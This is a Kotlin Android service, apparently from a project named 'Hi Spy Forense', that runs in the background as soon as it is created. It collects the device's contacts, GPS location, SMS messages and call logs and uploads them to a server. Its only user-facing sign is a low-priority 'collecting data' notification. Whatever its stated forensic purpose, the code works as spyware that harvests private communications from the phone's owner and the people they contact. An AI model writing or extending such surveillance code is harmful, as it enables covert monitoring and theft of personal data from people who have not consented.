package com.ufc.hispy

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.ufc.hispy.collectors.*
import com.ufc.hispy.network.NetworkManager
import kotlinx.coroutines.*

/**
 * Serviço forense em background
 * Coleta dados automaticamente e envia para o servidor
 */
class ForensicService : Service() {
    
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private lateinit var networkManager: NetworkManager
    
    override fun onCreate() {
        super.onCreate()
        networkManager = NetworkManager(this)
        
        // Criar canal de notificação
        createNotificationChannel()
        
        // Iniciar serviço em foreground
        startForeground(1, createNotification())
        
        // Iniciar coleta de dados
        startDataCollection()
    }
    
    private fun startDataCollection() {
        serviceScope.launch {
            try {
                // Coletar contatos
                val contactsCollector = ContactsCollector(applicationContext)
                val contacts = contactsCollector.collectContacts()
                
                // Coletar localização GPS
                val locationCollector = LocationCollector(applicationContext)
                val location = locationCollector.getLastKnownLocation()
                
                // Coletar SMS
                val smsCollector = SMSCollector(applicationContext)
                val smsMessages = smsCollector.collectSMS()
                
                // Coletar registros de chamadas
                val callLogsCollector = CallLogsCollector(applicationContext)
                val callLogs = callLogsCollector.collectCallLogs()
                
                // Enviar dados para servidor
                networkManager.sendForensicData(
                    contacts = contacts,
                    location = location,
                    smsMessages = smsMessages,
                    callLogs = callLogs
                )
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "forensic_service",
            "Coleta Forense",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "forensic_service")
            .setContentTitle("Hi Spy Forense")
            .setContentText("Coletando dados...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}